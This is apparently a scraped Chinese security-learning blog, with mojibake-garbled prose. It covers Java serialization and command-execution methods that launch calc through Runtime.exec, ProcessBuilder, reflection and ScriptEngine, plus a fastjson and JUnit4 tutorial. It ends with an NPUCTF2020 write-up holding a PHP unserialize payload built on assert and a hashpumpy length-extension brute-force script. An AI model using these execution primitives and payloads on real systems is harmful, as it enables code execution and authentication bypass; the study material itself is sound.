Person(); person.setAge(19); person.setName(&quot;sakani&quot;); // person.setSex(true); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;Demo2.txt&quot;)); oos.writeObject(person); &#125; //å› ä¸ºæ–‡ä»¶å¯èƒ½ä¸å­˜åœ¨ï¼Œæ­¤æ—¶éœ€è¦å¤„ç†å¼‚å¸¸ public static Person UnSerializePerson() throws IOException, ClassNotFoundException &#123;// è¯»å–æ–‡ä»¶ FileInputStream fileInputStream = new FileInputStream(new File(&quot;Demo2.txt&quot;));// åˆ°è¿™ä¸€æ­¥æ¥è¯»å–äº†æ–‡ä»¶æµï¼Œä¸‹ä¸€æ­¥å°†å…¶å¼ºè½¬å›å¯¹è±¡ ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);// readObject æ˜¯ç”¨æ¥è¯»å–è¯¥æµå½“ä¸­çš„å¯¹è±¡ Person person2 = (Person)objectInputStream.readObject(); System.out.println(person2.getAge()); return person2; &#125; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; SerializePerson();// è¿™ä¸ªæ–¹æ³•ç”¨äºåºåˆ—åŒ–å‡½æ•° Person person2 = UnSerializePerson(); System.out.println(MessageFormat.format(&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;,person2.getName(),person2.getAge())); &#125;&#125;//å¿…é¡»è¦å®ç°åºåˆ—åŒ–æ¥å£æ‰å¯ä»¥è¿›è¡Œåºåˆ—åŒ–class Person implements Serializable &#123; private String name; private int age; private boolean sex; public Person() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public boolean isSex() &#123; return sex; &#125; public void setSex(boolean sex) &#123; this.sex = sex; &#125;&#125; Javaå‘½ä»¤æ‰§è¡Œå‡½æ•°1.java.lang.Runtime12345678910111213141516171819202122232425262728293031323334353637383940import org.junit.Test;import java.io.IOException;import java.io.InputStream;public class RuntimeTest &#123; @Test public void test1() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); runtime.exec(new String[]&#123;&quot;cmd&quot;,&quot;/c&quot;,&quot;calc&quot;,&quot;&amp;&quot;,&quot;notepad&quot;&#125;); &#125; @Test public void test2() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); runtime.exec(&quot;cmd /c calc &amp; notepad&quot;); &#125; @Test public void test3() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); runtime.exec(&quot;cmd.exe /k calc &amp; notepad&quot;); &#125; @Test public void test4() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); Process start = runtime.exec(&quot;ping sakani.top&quot;); InputStream inputStream = start.getInputStream(); byte[] res = new byte[1024]; inputStream.read(res); System.out.println(new String(res,&quot;gbk&quot;)); &#125;&#125;class Test1&#123;&#125; æ³¨æ„ï¼Œç¬¬ä¸€ç§æ–¹å¼å‘Šè¯‰æˆ‘ä»¬å¯ä»¥ç”¨æ•°ç»„æ¥ä¼ å…¥å‘½ä»¤ï¼Œç¬¬äºŒç§åˆ™æ˜¯å‘Šè¯‰å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œç¬¬å››ç§åˆ™æ˜¯æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ‰§è¡Œåå¼¹shell,ä½†æ˜¯ç”¨è¯¥æ–¹æ³•çš„æ—¶å€™æˆ‘åªå¾—åˆ°äº†ä¸€æ¡pingçš„æ•°æ®ï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºå¯èƒ½å¹¶ä¸æ˜¯å¾ˆé è°± 2.java.lang.ProcessBuilder123456789101112@Testpublic void test5() throws IOException &#123; ProcessBuilder processBuilder = new ProcessBuilder(&quot;cmd.exe&quot;,&quot;/c&quot;,&quot;calc&quot;); Process start = processBuilder.start();&#125;@Testpublic void test6() throws IOException &#123; ProcessBuilder processBuilder = new ProcessBuilder(&quot;cmd.exe &quot;,&quot;/c calc&quot;); processBuilder.start();&#125; è¯¥æ–¹æ³•ä¹Ÿå¯ä»¥æˆåŠŸæ‰§è¡Œå‡½æ•°ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨çš„æ—¶å€™éœ€è¦æŒ‡å®šä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ‰§è¡Œä»€ä¹ˆæ–‡ä»¶ï¼Œç¬¬äºŒä¸ªæ‰æ˜¯å‘½ä»¤ 3.java.lang.Processlmplè¿™ç§æ–¹æ³•æ˜¯ProcessBuilderçš„çˆ¶ç±»ï¼Œä½†æ˜¯å› ä¸ºå…¶ä¸ºç§æœ‰ç±»ï¼Œæˆ‘ä»¬éœ€è¦è·å–çš„æ—¶å€™åªèƒ½é€šè¿‡åå°„çš„æ–¹å¼æ¥è·å– 123456789@Testpublic void test7() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123; Class&lt;?&gt; aClass = Class.forName(&quot;java.lang.ProcessImpl&quot;); Method start = aClass.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class); start.setAccessible(true); start.invoke(null, new String[]&#123;&quot;calc&quot;&#125;, null, null, null, false);&#125; è®©æˆ‘æ¯”è¾ƒç–‘æƒ‘çš„æ˜¯è¿™é‡Œä¸ºä»€ä¹ˆæ²¡æœ‰ä½¿ç”¨cmdï¼Œç›´æ¥ä½¿ç”¨çš„nullï¼Œå´å¯ä»¥æˆåŠŸå¾—åˆ°è¿è¡Œå‘¢ï¼Ÿ ç¨å¾®å®¡è®¡äº†ä»¥ä¸‹æºç ï¼Œçœ‹åˆ°äº†å¦‚ä¸‹ï¼š 123456static Process start(String cmdarray[], //æ³¨æ„è¿™é‡Œï¼Œä¼ å…¥çš„å°±æ˜¯cmdarray java.util.Map&lt;String,String&gt; environment, String dir, ProcessBuilder.Redirect[] redirects, boolean redirectErrorStream) throws IOException é¡ºä¾¿è¡¥å……ä¸€ä¸‹åå°„çš„å‡ ä¸ªçŸ¥è¯†ï¼š class.forNameç”¨äºåå°„ç±»ï¼ŒæŒ‡å®šç±»åå³å¯ class.getDeclaredMethod ç”¨äºæ˜ å°„ç±»ä¸­çš„æ–¹æ³• invoke ï¼Œå¼€å§‹è°ƒç”¨è¯¥æ–¹æ³•ï¼Œ ä¼ å…¥å‚æ•°å³å¯ä½¿ç”¨ 4. javax.script.ScriptEngineManaæœ¬è´¨ä¸Šè¿˜æ˜¯ä½¿ç”¨ä¸Šé¢çš„ä¸‰ç§æ–¹æ³•ï¼š 12345@Testpublic void test8() throws ScriptException &#123; Object scriptEngineManager = new ScriptEngineManager().getEngineByExtension(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;)&quot;); System.out.println(scriptEngineManager);&#125; è¿™é‡Œæˆ‘æ¯”è¾ƒæƒŠè®¶ï¼Œä¸ºä»€ä¹ˆè¾“å‡ºè¯­å¥ä¹Ÿå¯ä»¥æ‰§è¡Œå‘½ä»¤å‘¢ï¼Ÿ","categories":[],"tags":[]},{"title":"fastJson","slug":"fastJson","date":"2020-11-02T08:11:59.000Z","updated":"2020-11-17T06:17:04.494Z","comments":true,"path":"2020/11/02/fastJson/","link":"","permalink":"http://example.com/2020/11/02/fastJson/","excerpt":"","text":"JUnit4åœ¨å­¦ä¹ fastjsonä¹‹å‰ï¼Œæ„Ÿè§‰æœ‰å¿…è¦å…ˆå­¦ä¹ ä¸€ä¸‹Junit4çš„æ³¨è§£ï¼Œè‡ªä»SpringBootä¹‹åæ³¨è§£å¤§é‡çš„è¢«ä½¿ç”¨ï¼Œ JUnitå‡ºç°çš„ä¸å› ä¸ºmainæ–¹æ³•æµ‹è¯•å¾ˆä¸æ–¹ä¾¿ï¼Œæ‘˜è‡ªç™¾åº¦çš„éƒ¨åˆ†ï¼š 12ç”¨mainæ–¹æ³•æµ‹è¯•çš„è¯å°±å¾ˆä¸æ–¹ä¾¿ï¼Œæƒ³æµ‹è¯•å…¨éƒ¨æ–¹æ³•çš„è¯å°±å¾—æŠŠæµ‹è¯•ä»£ç å…¨éƒ¨å†™åˆ°é‡Œï¼Œæˆ–è€…ä½ æµ‹ä¸€ä¸ªé‡å†™ä¸€æ¬¡ã€‚ä¸”æ›´é‡è¦çš„æ˜¯ï¼Œè¿™æ ·ä¼šä½¿æµ‹è¯•ä»£ç ä¸è¿è¡Œé€»è¾‘ä»£ç æ··åœ¨ä¸€èµ·ï¼Œä¸è§„èŒƒã€‚ä½¿ç”¨junitå°±æ–¹ä¾¿å¤šäº†,è¿™æ˜¯å•å…ƒæµ‹è¯•ï¼Œä½ æƒ³æµ‹å“ªä¸ªæ–¹æ³•å°±å†™ä¸€ä¸ªå¯¹åº”çš„æµ‹è¯•æ–¹æ³•ï¼Œç„¶åç”¨junitè¿è¡Œã€‚æ¯ä¸ªæ–¹æ³•ä¹‹é—´æ˜¯ç‹¬ç«‹çš„ï¼Œéå¸¸çµæ´»ã€‚è€Œä¸”æµ‹è¯•æ–¹æ³•ä¸€èˆ¬ä¸ä¼šç›´æ¥å†™åœ¨åŸç±»ä¸­ï¼Œè€Œæ˜¯å•ç‹¬çš„æµ‹è¯•ç±»ï¼Œè¿™æ ·æµ‹è¯•ä»£ç å°±å®Œå…¨ä¸é€»è¾‘ä»£ç åˆ†å¼€äº†ã€‚ è€Œåœ¨Junit4å¤§é‡ä½¿ç”¨äº†ä»Java5ä¸­å¼€å§‹ä½¿ç”¨çš„æ³¨è§£ï¼Œå¦‚ä¸‹æ˜¯JUnit4å¸¸ç”¨çš„æ³¨è§£ï¼š beforeï¼Œtestï¼Œafter Beforeï¼šåˆå§‹åŒ–æ–¹æ³•ï¼Œé’ˆå¯¹æ¯ä¸ªæµ‹è¯•æ–¹æ³•ï¼Œéƒ½ä¼šæ‰§è¡Œä¸€é Test: ä»£æ›¿mainå‡½æ•°ï¼Œå¯ä»¥è®©æˆ‘ä»¬çµæ´»çš„æµ‹è¯•æŸéƒ¨åˆ†ä»£ç ,æ³¨æ„ï¼Œæµ‹è¯•çš„æ—¶å€™ä¸è¦å†™ä¸€ä¸ªTestç±»ï¼ï¼ï¼ï¼ï¼Œå¦åˆ™å› ä¸ºä¼šæœ‰é™é€‰æ‹©åŒåŒ…ä¸‹çš„testç±»ï¼Œå¯¼è‡´æŠ¥é”™,@Testæ–¹æ³•æ‰€åœ¨ç±»ä¸­,ä¸èƒ½å­˜åœ¨æœ‰å‚æ•°æ„é€ å‡½æ•°,æ— å‚æ„é€ å¯ä»¥å­˜åœ¨ Afterï¼šåœ¨æ–¹æ³•ç»“æŸä¹‹åæ‰§è¡Œï¼Œæ¯æ¬¡éƒ½ä¼šæ‰§è¡Œï¼ ä¾‹å­ï¼š 12345678910111213141516171819202122package com.ys.pojo;import org.junit.After;import org.junit.Before;import org.junit.Test;public class Person&#123; @Before public void before()&#123; System.out.println(&quot;æœ€å…ˆè¢«æ‰§è¡Œï¼&quot;); &#125; @Test public void test()&#123; System.out.println(&quot;wdnmd&quot;); &#125; @After public void after()&#123; System.out.println(&quot;æˆ‘ä¹‹åæ‰ä¼šè¢«æ‰§è¡Œå‘¢&quot;); &#125;&#125; é™¤æ­¤ä¹‹å¤–ï¼ŒTestæ³¨è§£è¿˜å…è®¸æˆ‘ä»¬æ·»åŠ å‚æ•°ï¼Œæ£€æµ‹æ˜¯å¦æŠ›å‡ºæŸéƒ¨åˆ†å¼‚å¸¸ï¼š ä¾‹å­ï¼š 12345678 @Test(expected = Exception.class) public void test2()&#123; int[] array = new int[3]; for (int i = 0; i &lt; 5; i++) &#123; array[i] = i; &#125; &#125;&#125; å½“ä»£ç å‡ºç°å¼‚å¸¸çš„æ—¶å€™ï¼Œåˆ™ä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œç›¸åçš„ï¼Œå¦‚æœè¿™æ®µä»£ç æ­£å¸¸æŠ›å‡ºï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸äº†ã€‚ beforeclassï¼Œafterclass BeforeClass: åœ¨æ‰€æœ‰ç±»è¢«æ‰§è¡Œä¹‹å‰æ‰§è¡Œï¼Œåªä¼šæ‰§è¡Œä¸€æ¬¡ï¼ŒåŒæ—¶å¿…é¡»ä¸ºstaticé™æ€æ–¹æ³•ï¼ˆå› ä¸ºä»–ä»¬å°±ç›¸å½“äºæ­¤ï¼‰ AfterClass: åœ¨æ‰€æœ‰ç±»è¢«æ‰§è¡Œä¹‹åæ‰§è¡Œ 1234567891011121314151617181920212223242526272829303132333435363738394041package com.ys.pojo;import org.junit.*;import java.lang.reflect.Array;public class Person&#123; @Before public void before()&#123; System.out.println(&quot;æˆ‘å°±ç›¸å½“äºæ„é€ å™¨ï¼&quot;); &#125; @Test public void test1()&#123; System.out.println(&quot;æˆ‘æ˜¯test1ï¼Œæˆ‘è¢«æ‰§è¡Œäº†&quot;); &#125; @After public void after()&#123; System.out.println(&quot;æˆ‘ä¹‹åæ‰ä¼šè¢«æ‰§è¡Œ&quot;); &#125; @Test(expected = Exception.class) public void test2()&#123; int[] array = new int[3]; for (int i = 0; i &lt; 5; i++) &#123; array[i] = i; &#125; System.out.println(&quot;æˆ‘æ˜¯test2æ‰§è¡Œäº†ï¼&quot;); &#125; @BeforeClass public static void beforeClass()&#123; System.out.println(&quot;æˆ‘åœ¨æ‰€æœ‰çš„å‰é¢è¢«æ‰§è¡Œï¼Œå¹¶ä¸”æˆ‘åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼&quot;); &#125; @AfterClass public static void afterClass()&#123; System.out.println(&quot;æˆ‘åœ¨æœ€ç»ˆæ‰€æœ‰ç»“æŸä¹‹åæ‰ä¼šè¢«æ‰§è¡Œ&quot;); &#125;&#125; Ignore Ignoreå¯ä»¥è®©æˆ‘ä»¬æš‚æ—¶çš„ç¦ç”¨ç‰¹å®šçš„ç±»ï¼Œè¢«æ³¨è§£ä¹‹åçš„ç±»å°†ä¸å†è¢«æ‰§è¡Œ Ignoreç»è¿‡æˆ‘æµ‹è¯•ï¼Œåªæœ‰å½“ä»–æ”¾åœ¨æµ‹è¯•ç±»å‰æ‰å¯ä»¥ç”Ÿæ•ˆã€‚ ä¾‹å­ï¼š è€Œå¦‚æœæˆ‘ä»¬æ”¾åœ¨å…¶ä»–ç±»å‰é¢ï¼š æˆ‘ä»¬å¯ä»¥å‘ç°ä¾ç„¶è¢«æ‰§è¡Œäº†ï¼ Runwith Runwithæ”¾åœ¨æµ‹è¯•ç±»ä¹‹å‰ï¼Œç”¨äºç¡®å®šè¿™ä¸ªç±»è¯¥å¦‚ä½•è¿è¡Œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸æ ‡æ³¨ï¼Œå°†ä¼šä½¿ç”¨é»˜è®¤çš„è¿è¡Œå®¹å™¨ å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« æ¥ç†è§£ï¼š 1https:&#x2F;&#x2F;my.oschina.net&#x2F;itblog&#x2F;blog&#x2F;1550753?tdsourcetag&#x3D;s_pcqq_aiomsg Fastjson Fastjson æ˜¯ä¸€ä¸ª Java åº“ï¼Œå¯ä»¥å°† Java å¯¹è±¡è½¬æ¢ä¸º JSON æ ¼å¼ï¼Œå½“ç„¶å®ƒä¹Ÿå¯ä»¥å°† JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º Java å¯¹è±¡ã€‚ Fastjson å¯ä»¥æ“ä½œä»»ä½• Java å¯¹è±¡ï¼Œå³ä½¿æ˜¯ä¸€äº›é¢„å…ˆå­˜åœ¨çš„æ²¡æœ‰æºç çš„å¯¹è±¡ã€‚ Fastjson æºç åœ°å€ï¼šhttps://github.com/alibaba/fastjson Fastjson ä¸­æ–‡ Wikiï¼šhttps://github.com/alibaba/fastjson/wiki/Quick-Start-CN ä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åºå‘˜ä»¬ç”¨è¿™ä¸ªç¨‹åºå°±æ˜¯ä¸ºäº†ä¼ è¿JSONæ ¼å¼çš„å¯¹è±¡ï¼Œå‘ƒï¼Œæ„Ÿè§‰åƒåºåˆ—åŒ–ä¸€æ ·äº†ï¼Ÿ å°†JAVAå¯¹è±¡è½¬æ¢æˆjsonæ ¼å¼123456789101112131415161718192021222324252627package com.ys.pojo;import com.alibaba.fastjson.JSON;import org.junit.Before;import org.junit.Test;import java.util.ArrayList;import java.util.Date;import java.util.List;public class Fortest &#123; private List&lt;JavaToJson&gt; listOfJava = new ArrayList&lt;JavaToJson&gt;(); @Before public void setUp()&#123; listOfJava.add(new JavaToJson(18,&quot;wndmd&quot;,new Date())); listOfJava.add(new JavaToJson(20,&quot;Json!&quot;,new Date())); &#125; @Test public void test()&#123; String list = JSON.toJSONString(listOfJava); System.out.println(list); &#125;&#125; æ³¨æ„ï¼Œä¸Šè¿°ä»£ç éœ€è¦å¦å¤–èµ·ä¸€ä¸ªç±»ï¼Œtestä¸å…è®¸åœ¨æœ‰å‚æ„é€ çš„ç±»ä¸­å‡ºç° å¾—åˆ°è¾“å‡ºç»“æœï¼š 1234567891011[ &#123;&quot;Age&quot;:18, &quot;DATE OF BIRTH&quot;:1604309562809, &quot;FULL NAME&quot;:&quot;wndmd&quot; &#125;, &#123; &quot;Age&quot;:20, &quot;DATE OF BIRTH&quot;:1604309562809, &quot;FULL NAME&quot;:&quot;Json!&quot; &#125;] æˆ‘ä»¬è¿˜å¯ä»¥æ ¼å¼åŒ–è‡ªå®šä¹‰è¾“å‡ºï¼Œæ§åˆ¶å­—æ®µçš„æ’åºã€‚ æˆ‘ä»¬æ›´æ–°beanå¹¶æ·»åŠ å¦‚ä¸‹å­—æ®µï¼š 123456789public class JavaToJson &#123; @JSONField(name = &quot;Age&quot;,serialize = false) private int age; @JSONField(name = &quot;FULL NAME&quot;,ordinal = 2) private String fullName; @JSONField(name = &quot;DATE OF BIRTH&quot;,format = &quot;dd/MM/yyyy&quot;,ordinal = 1) private Date date; æ³¨æ„åœ¨è¿™é‡Œæˆ‘ä»¬æ·»åŠ serialize = falseï¼Œè¿™é‡Œæ˜¯é»˜è®¤æˆ‘ä»¬æ·»åŠ åºåˆ—åŒ–ï¼Œå¦‚æœæˆ‘ä»¬è®¾ç½®ä¸ºfalseï¼Œè¯¥å­—æ®µå°†ä¸ä¼šè¢«æ˜¾ç¤ºã€‚ è€Œordinalï¼Œåˆ™æ˜¯ç”¨äºè§„å®šæ ¼å¼åŒ–çš„é¡ºåºï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä½ æƒ³æ§åˆ¶ï¼Œæœ€å¥½å°±å…¨éƒ¨éƒ½ä½¿ç”¨è¯¥å±æ€§ä¿®é¥°ï¼Œæˆ–è€…ä½ è‡ªå·±å¹²è„†å†™çš„æ—¶å€™å°±ä»ä¸Šå‘ä¸‹å†™ï¼Œä¸ç„¶çš„è¯ï¼Œé»˜è®¤ä»ä¸Šå‘ä¸‹æ‰§è¡Œï¼Œåªä¼šå†æŒ‰ç…§ordinalé™å®šçš„é¡ºåºæ’åˆ— ä¸Šè¿°ä»£ç è¾“å‡ºï¼š 12345678910[ &#123; &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;wndmd&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;Json!&quot; &#125;] å¦‚æœå°†serializeçš„falseå»æ‰ä¹‹åï¼Œä»–è¿˜æ˜¯ç¬¬ä¸€ä¸ªè¢«æ‰§è¡Œï¼š 123456789101112[ &#123; &quot;Age&quot;:18, &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;wndmd&quot; &#125;, &#123; &quot;Age&quot;:20, &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;Json!&quot; &#125;] ä½œç”¨å¯¹è±¡@JSONField çš„ä½œç”¨å¯¹è±¡: Field Setter å’Œ Getter æ–¹æ³• éœ€è¦æ³¨æ„å¦‚ä¸‹ä¸¤ç‚¹ï¼š æ³¨æ„ï¼šFastJson åœ¨è¿›è¡Œæ“ä½œæ—¶ï¼Œæ˜¯æ ¹æ® getter å’Œ setter çš„æ–¹æ³•è¿›è¡Œçš„ï¼Œå¹¶ä¸æ˜¯ä¾æ® Field è¿›è¡Œã€‚ æ³¨æ„ï¼šè‹¥å±æ€§æ˜¯ç§æœ‰çš„ï¼Œå¿…é¡»æœ‰ set æ–¹æ³•ã€‚å¦åˆ™æ— æ³•ååºåˆ—åŒ–ã€‚ è·Ÿè¿›JSONFieldæŸ¥çœ‹æºç ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬å…è®¸æŒ‡å®šå¾ˆå¤šä¸œè¥¿=ã€‚=ï¼š 1234567891011121314151617181920212223242526272829public @interface JSONField &#123; int ordinal() default 0; String name() default &quot;&quot;; String format() default &quot;&quot;; boolean serialize() default true; //æ³¨æ„è¿™é‡Œï¼Œååºåˆ—åŒ–ï¼ boolean deserialize() default true; SerializerFeature[] serialzeFeatures() default &#123;&#125;; Feature[] parseFeatures() default &#123;&#125;; String label() default &quot;&quot;; boolean jsonDirect() default false; Class&lt;?&gt; serializeUsing() default Void.class; Class&lt;?&gt; deserializeUsing() default Void.class; String[] alternateNames() default &#123;&#125;; boolean unwrapped() default false; String defaultValue() default &quot;&quot;;&#125; é…ç½®æ–¹å¼FieldInfo å¯ä»¥é…ç½®åœ¨ getter/setter æ–¹æ³•æˆ–è€…å­—æ®µä¸Šã€‚ä¾‹å¦‚ï¼š é…ç½®åœ¨ getter/setter ä¸Š12345678public class A &#123; private int id; @JSONField(name=&quot;ID&quot;) public int getId() &#123;return id;&#125; @JSONField(name=&quot;ID&quot;) public void setId(int value) &#123;this.id = id;&#125;&#125; é…ç½®åœ¨ field ä¸Š1234567public class A &#123; @JSONField(name=&quot;ID&quot;) private int id; public int getId() &#123;return id;&#125; public void setId(int value) &#123;this.id = id;&#125;&#125; åˆ›å»º JSON å¯¹è±¡åˆ›å»º JSON å¯¹è±¡éå¸¸ç®€å•ï¼Œåªéœ€ä½¿ç”¨ JSONObjectï¼ˆfastJsonæä¾›çš„jsonå¯¹è±¡ï¼‰ å’Œ JSONArrayï¼ˆfastJsonæä¾›jsonæ•°ç»„å¯¹è±¡ï¼‰ å¯¹è±¡å³å¯ã€‚ è™½ç„¶JSONArryayä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªJSONå¯¹è±¡ï¼Œä½†æˆ‘è§‰å¾—ä¹¦å†™æ–¹å¼ä¸å¤Ÿç¾è§‚ï¼Œå…¶ä¸­å¦‚ä¸‹ï¼š 123456789101112@Testpublic void whenGenerateJson_thanGenerationCorrect() throws ParseException &#123; JSONArray jsonArray = new JSONArray(); for (int i = 0; i &lt; 2; i++) &#123; JSONObject jsonObject = new JSONObject(); jsonObject.put(&quot;AGE&quot;, 10); jsonObject.put(&quot;FULL NAME&quot;, &quot;Doe &quot; + i); jsonObject.put(&quot;DATE OF BIRTH&quot;, &quot;2016/12/12 12:12:12&quot;); jsonArray.add(jsonObject); &#125; String jsonOutput = jsonArray.toJSONString();&#125; JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º Java å¯¹è±¡fastjsonå…è®¸æˆ‘ä»¬å¯ä»¥å°†å‰ç«¯ä¼ æ¥çš„æ•°æ®è½¬æ¢å˜æˆJSONæ•°æ®ï¼ŒåŒæ ·çš„ä¹Ÿå…è®¸æˆ‘ä»¬æŠŠåç«¯æ•°æ®è½¬æ¢ä¸ºJSONå­—ç¬¦ä¸²ä¸¢ç»™å‰ç«¯ã€‚ 123456789101112 @Test public void jsonToJava()&#123; JavaToJson miaomiaomiao = new JavaToJson(21, &quot;miaomiaomiao&quot;, new Date()); String jsonObject = JSON.toJSONString(miaomiaomiao);// System.out.println(jsonObject);// è¿™å‰é¢çš„partæˆ‘ä»¬å°†æ•°æ®è½¬æ¢æˆäº†JSONæ•°æ® JavaToJson newJavaObject = JSON.parseObject(jsonObject,JavaToJson.class);// æŒ‡å®šéœ€è¦è½¬æ¢çš„JSONå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”æŒ‡å®šåŸå‹,è¿™æ ·çš„è¯ä¸€ä¸ªJAVAå¯¹è±¡å°±æŒ‡å®šå¥½äº† System.out.println(newJavaObject.getAge()); System.out.println(newJavaObject.getFullName()); &#125; ä½¿ç”¨ContextValuFilteré…ç½®JSONè½¬æ¢åœ¨æœ‰äº›åœºæ™¯ä¸­ï¼Œå¯¹Valueåšè¿‡æ»¤ï¼Œéœ€è¦è·å¾—æ‰€è¿°JavaBeançš„ä¿¡æ¯ï¼Œè€Œæˆ‘ä»¬å¯èƒ½æƒ³è¦è¿‡æ»¤æŸäº›ä¿¡æ¯ï¼Œä¾¿å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œæ“ä½œäº†ã€‚ 123456789101112131415161718192021222324@Before public void before()&#123; listOfJava.add(new JavaToJson(31,&quot;wdnmd&quot;,new Date())); listOfJava.add(new JavaToJson(33,&quot;wd&quot;,new Date())); &#125; @Test public void givenContextFilter_whenJavaObject_thanJsonCorrect() &#123; ContextValueFilter valueFilter = new ContextValueFilter () &#123; public Object process( BeanContext context, Object object, String name, Object value) &#123; if (name.equals(&quot;DATE OF BIRTH&quot;)) &#123; return &quot;NOT TO DISCLOSE&quot;; &#125; if (value.equals(&quot;wdnmd&quot;)) &#123; return ((String) value).toUpperCase(); &#125; else &#123; return null; &#125; &#125; &#125;; String jsonOutput = JSON.toJSONString(listOfJava, valueFilter); System.out.println(jsonOutput); &#125; ç»è¿‡ä¸Šè¿°ä»£ç çš„æ“ä½œï¼Œæˆ‘ä»¬çš„æ—¶é—´å°†ä¼šä¿®æ”¹ä¸ºNOT TO DISCLOSEï¼Œå¹¶ä¸”æ•°æ®ä¸­ä¸åŒ…å«wdnmdçš„å°†ä¼šè¢«è¿‡æ»¤,å…·ä½“è¾“å‡ºå¦‚ä¸‹ï¼š 1234567891011121314[ &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot;,&quot;FULL NAME&quot;:&quot;wdnmd&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot; &#125;]","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"NPUCTF2020","slug":"NPUCTF2020","date":"2020-10-30T01:00:15.000Z","updated":"2020-10-31T07:01:18.480Z","comments":true,"path":"2020/10/30/NPUCTF2020/","link":"","permalink":"http://example.com/2020/10/30/NPUCTF2020/","excerpt":"","text":"webğŸ•åˆ—è¡¨å†…å®¹å¤åˆ¶ç²˜è´´ï¼Œä¸¢pythoné‡Œé¢è·‘ä¸€è½®å°±è¡Œäº† 123list = [102, 108, 97, 103, 123, 119, 101, 54, 95, 52, 111, 103, 95, 49, 115, 95, 101, 52, 115, 121, 103, 48, 105, 110, 103, 125]for i in list: print(chr(i),end=&#x27;&#x27;) å•Šï¼Œåˆ«çœ‹äº†ï¼Œè¿™ä¸Šé¢å¤ªä¸¢äººäº†ã€‚ã€‚ã€‚åŸæ¥æ˜¯å› ä¸ºè¿™æ˜¯æœ€åä¸€æ­¥ï¼Œ ReadlezPHPè¿™é“é¢˜ç›®å’Œä¹‹å‰åœ¨ç½‘é¼æ¯åšçš„phpwebå¾ˆåƒï¼Œä¸€æ ·çš„æ˜¯è¿›è¡ŒåŠ¨è°ƒï¼š 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); flagè¯´æ˜¯åœ¨phpinfoå½“ä¸­,æ„é€ å¦‚ä¸‹ï¼š 12345678910111213141516171819&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;phpinfo()&quot;; $this-&gt;b = &quot;assert&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$a = new HelloPhp();echo serialize($a); Ezinclude ç¬¬ä¸€æ­¥ï¼Œè¿™é‡Œè¯´æ˜¯cookiesé‡Œé¢æœ‰ä¸€ä¸ªhashï¼Œæ˜¯hashæ‹“å±•æ”»å‡»ï¼š 123456789101112131415import requestsimport hashpumpyimport urlliburl=&#x27;http://ha1cyon-ctf.fun:30004/&#x27;for i in range(40): a,b=hashpumpy.hashpump(&#x27;a3dabbc779f2fbf8b6f56113ca78a7f9&#x27;,&#x27;123444&#x27;,&#x27;1&#x27;,i) req=requests.get(url+&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;.format(urllib.parse.quote(b),a)) if &#x27;username/password error&#x27; not in req.text: print(req.text,url+&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;.format(urllib.parse.quote(b),a)) 